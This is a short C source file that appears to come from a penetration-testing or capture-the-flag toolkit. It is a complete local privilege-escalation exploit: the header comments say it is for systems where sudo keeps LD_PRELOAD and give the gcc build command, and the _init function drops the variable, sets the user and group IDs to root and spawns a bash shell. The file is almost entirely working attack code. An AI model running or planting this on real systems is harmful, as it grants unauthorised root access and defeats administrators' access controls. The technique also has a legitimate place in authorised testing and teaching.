/*useful when sudo -l returns env_keep+=LD_PRELOAD*/
/*compile: 
     gcc -fPIC -shared -o shell.so spawn-root-shell.c -nostartfiles*/
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
